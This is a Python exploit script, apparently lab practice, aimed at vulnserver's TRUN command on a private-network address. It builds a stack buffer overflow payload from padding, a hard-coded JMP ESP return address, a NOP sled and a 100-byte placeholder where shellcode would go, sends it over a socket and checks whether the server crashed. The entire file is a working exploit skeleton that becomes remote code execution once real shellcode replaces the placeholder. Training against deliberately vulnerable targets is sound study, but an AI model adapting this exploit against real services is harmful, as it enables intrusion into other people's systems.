import socket
import sys

ip = "192.168.201.227"
port = 9999
A_NUM = 2006

# Create the payload with TRUN command
A = b"A" * A_NUM

jmp_esp = b"\xA8\x11\x50\x62"

nop_sled = b"\x90" * 20

shell = b"C" * 100

payload = b"TRUN ." + A + jmp_esp + nop_sled + shell + b"\r\n"

print(f"Payload length: {len(payload)}")
print(f"A's: {A_NUM}, Total padding before EIP: {len(b'TRUN .') + A_NUM}")
print(f"jmp_esp address: 0x625011A8")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(5)
    sock.connect((ip, port))
    print("connected")
    
    # Receive banner
    banner = sock.recv(1024)
    print("Banner:", banner.decode())
    
    # Send payload
    print(f"Sending payload of {len(payload)} bytes...")
    sock.send(payload)
    
    # Try to receive response
    try:
        response = sock.recv(1024)
        print("Response:", response.decode())
    except socket.timeout:
        print("No response")
    except Exception as e:
        print(f"Receive error (expected if server crashed): {e}")
    
    sock.close()
except ConnectionRefusedError:
    print("Connection refused - is vulnserver running?")
except socket.timeout:
    print("Connection timeout")
except Exception as e:
    print(f"Error: {str(e)}")